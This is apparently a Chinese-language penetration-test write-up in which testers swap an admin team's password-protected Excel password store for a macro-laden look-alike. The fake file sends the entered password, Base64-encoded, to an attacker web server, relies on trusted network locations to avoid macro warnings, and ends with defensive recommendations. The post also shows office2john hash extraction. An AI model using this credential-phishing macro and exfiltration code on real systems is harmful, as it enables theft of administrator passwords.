介绍



Excel为用户提供了给工作表分配密码的选项，可以用来防止未经授权的访问。该操作在File-> Info-> Protect Workbook->Encrypt with Password选项卡下完成：

今年早些时候，0x23353435和我在客户环境中进行了内部渗透测试。为了凸显被发现的漏洞的严重性，如果双方同意，我们通常向客户展示最坏的情况。有了最高特权，攻击者实现其既定目标只是时间上的问题。我们已经在Azure-Cloud上实现了从Domain Administrator到Global Admin的目标，并且可以访问protected networks。但我们还无法访问内部IT的密码管理器。所以不确保能否访问防火墙，交换机等。但是，我们已经发现这些使用密码保护的Excel文件。它位于管理员团队网络共享的文件服务器中。只有其团队的小组成员才有读取和写入权限。我们有一些管理员凭据，所以对该共享也具有写入权限。我们第一次尝试用office2john.py访问丢失的密码。从受保护的Excel文件中获取可破解的哈希非常简单，如下所示：


python office2john.py Protected.xlsx > Excelhash.txt


如果设置的密码不够复杂，可以用john破解或用生成的哈希hashcat。由于密码复杂，我们未能成功破解Excel密码管理器的密码。获得访问权限的另一种方法是攻击管理员客户端计算机，把它连接到我们的C2-Server并通过键盘记录器捕获密码。但是，这种方式并不可取，因为所有管理员都会同时受到攻击。毕竟，我们无法得知哪个人会打开文件以及何时打开文件。所以，我们考虑把Excel密码管理器替换为包含自定义宏的单独Excel文件。钓鱼文件的行为和受密码保护的Excel文件一样，它把密码发送到攻击者系统。

现在，我们思考该如何提取密码。在这种特定情况下，在同一网络上有一个攻击者系统，通过Web请求可以把密码提取到我们的Web服务器，这是最简单方法。如果在同一网络上没有系统，还可以通过DNS提取密码。在发送密码之前先对其进行编码，所以要搜索VBA Base64函数：


Function EncodeBase64(text As String) As String  Dim arrData() As Byte  arrData = StrConv(text, vbFromUnicode)

要将伪造的密码从TextBox提取到Web服务器，需要用到以下代码：


Dim xmlhttp As New MSXML2.xmlhttp60, myurl As Stringmyurl = "http://192.168.100.128/" + EncodeBase64(TextBox1.text)xmlhttp.Open "GET", myurl, Falsexmlhttp.Send


为了让最终用户看起来更合法，我们将原始Excel文件移动到网络共享的隐藏文件夹中，添加以下代码，在提交密码后打开原始文档：


On Error Resume NextDim Path As StringPath = Application.ActiveWorkbook.PathDim src As WorkbookOn Error GoTo WrongPWDSet src = Workbooks.Open(Path + "\Hidden\PasswordSafe.xlsx", True, True, Password:=TextBox1.text)ThisWorkbook.ActivateWorksheets("Sheet1") = src.Worksheets("sheet1")


如果密码输入正确，当前的Excel文件就会被关闭，并用该密码打开原始的Excel文件。

进一步完善



把宏添加到Excel文件后，用户很可能会看到“警告”窗口，必须启用它后才能弹出我们的MessageBox。



在给定的环境里，PasswordSafe.xlsx位于受信任的网络共享中。可以在本地计算机上指定受信任位置，也可以通过GPO指定受信任位置。每个受信任的位置不会出现警告窗口，并且所有宏都会直接执行。所以，在指定为受信任的网络共享中，带有宏的Excel文件可以不受限制的执行宏代码。可以在Office信任中心（位于Excel选项菜单中）中查找它们：



用目标帐户的给定凭据登录，启用宏把伪造的Excel-Phish文档标记为“受信任”。之所以能这么做，是因为警告在第一次执行时仅弹出一次。





04

解决方案



首先，解决允许攻击者在Active Directory环境中提升特权的漏洞和错误配置。如果可以防止快速提升特权，那么这里说到的攻击就很难以实现。


切勿使用Excel文件 —— 哪怕是把密码放到密码管理器保护。有更好，更安全的密码存储方式。建议是用只能通过多因素身份验证访问的集中式密码管理器。该解决方案支持角色和授权概念。

05

结论



我们展示了如何通过宏和网络钓鱼获取受密码保护的Excel文件。为此，你“仅”需要原始文档的写入权限。


破解弱密码或者用键盘记录程序是替代选择。


请勿使用Excel文件作为密码，并尽可能使用仅限数字签名的宏。检查受信任的位置 —— 或者对它们进行更严格的配置。
